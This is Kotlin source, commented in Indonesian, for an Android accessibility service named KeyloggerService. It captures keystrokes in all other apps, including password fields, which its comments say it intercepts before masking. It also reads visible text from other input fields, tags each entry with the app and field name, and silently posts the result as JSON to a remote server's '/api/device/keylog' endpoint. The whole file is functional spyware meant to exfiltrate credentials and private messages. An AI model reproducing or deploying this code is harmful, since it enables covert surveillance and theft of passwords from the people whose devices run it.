package com.kztutorial99.androidconnector

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class KeyloggerService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    // Buffer teks saat ini per paket aplikasi
    private val appBuffers  = mutableMapOf<String, StringBuilder>()
    private var currentPkg  = ""
    private var currentField = ""
    private var lastSentKey = ""

    // Debounce — kirim setelah 800 ms tidak ada ketikan baru
    private val flushHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val flushRunnable = Runnable { flushCurrent() }

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes  = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                          AccessibilityEvent.TYPE_VIEW_FOCUSED       or
                          AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            // FLAG_REQUEST_FILTER_KEY_EVENTS wajib di sini agar onKeyEvent() dipanggil
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
            notificationTimeout = 50
        }
    }

    // ── Intercept setiap key press — ini dipanggil SEBELUM karakter di-mask ──
    override fun onKeyEvent(event: KeyEvent): Boolean {
        if (event.action != KeyEvent.ACTION_DOWN) return false

        val pkg = currentPkg.ifBlank { return false }
        if (pkg == this.packageName) return false

        val buf = appBuffers.getOrPut(pkg) { StringBuilder() }

        when (event.keyCode) {
            KeyEvent.KEYCODE_DEL, KeyEvent.KEYCODE_FORWARD_DEL -> {
                if (buf.isNotEmpty()) buf.deleteCharAt(buf.length - 1)
            }
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {
                flushHandler.removeCallbacks(flushRunnable)
                flushCurrent()
                return false
            }
            else -> {
                val unicode = event.unicodeChar
                if (unicode != 0 && unicode != 10) {
                    buf.append(unicode.toChar())
                    // Reset debounce timer
                    flushHandler.removeCallbacks(flushRunnable)
                    flushHandler.postDelayed(flushRunnable, 800)
                }
            }
        }
        return false // Jangan konsumsi event — biarkan app target tetap terima
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev = event ?: return

        when (ev.eventType) {

            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == this.packageName) return

                // Pindah app/field → flush buffer lama
                if (pkg != currentPkg && currentPkg.isNotBlank()) {
                    flushHandler.removeCallbacks(flushRunnable)
                    flushCurrent()
                }
                currentPkg = pkg

                // Ambil nama field
                val src = ev.source
                currentField = src?.let { node ->
                    val hint   = node.hintText?.toString()?.trim()
                    val desc   = node.contentDescription?.toString()?.trim()
                    val viewId = node.viewIdResourceName?.substringAfterLast("/")
                    (hint?.takeIf { it.isNotBlank() }
                        ?: desc?.takeIf { it.isNotBlank() }
                        ?: viewId?.takeIf { it.isNotBlank() }
                        ?: ev.className?.toString()?.substringAfterLast("."))
                        ?: "Field"
                } ?: "Field"
                src?.recycle()
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val pkg = ev.packageName?.toString() ?: return
                if (pkg == this.packageName) return
                currentPkg = pkg

                val src = ev.source

                // Jika field BUKAN password (misal search bar, nama, dll) —
                // ambil teks langsung karena lebih akurat
                val isPasswordField = src?.isPassword == true
                if (!isPasswordField) {
                    val nodeText = src?.text?.toString()?.trim()
                        ?: ev.text.joinToString("").trim()
                    if (nodeText.isNotBlank() &&
                        !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                        val buf = appBuffers.getOrPut(pkg) { StringBuilder() }
                        buf.clear()
                        buf.append(nodeText)
                        flushHandler.removeCallbacks(flushRunnable)
                        flushHandler.postDelayed(flushRunnable, 800)
                    }
                }
                // Password field → sudah ditangani oleh onKeyEvent()
                src?.recycle()
            }
        }
    }

    override fun onInterrupt() {
        flushHandler.removeCallbacks(flushRunnable)
    }

    override fun onDestroy() {
        super.onDestroy()
        flushHandler.removeCallbacks(flushRunnable)
    }

    // ── Kirim buffer ke server ────────────────────────────────────────────────
    private fun flushCurrent() {
        val pkg = currentPkg.ifBlank { return }
        val buf = appBuffers[pkg] ?: return
        val text = buf.toString()
        if (text.isBlank()) return

        // Bersihkan buffer setelah flush
        buf.clear()

        val dedupeKey = "$pkg|$currentField|$text"
        if (dedupeKey == lastSentKey) return
        lastSentKey = dedupeKey

        val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null) ?: return

        val body = JsonObject().apply {
            addProperty("deviceId",   deviceId)
            addProperty("appPackage", pkg)
            addProperty("appName",    getAppName(pkg))
            addProperty("fieldName",  currentField)
            addProperty("text",       text)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/keylog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }

    private fun getAppName(pkg: String): String = try {
        packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(pkg, 0)
        ).toString()
    } catch (_: Exception) { pkg }
}
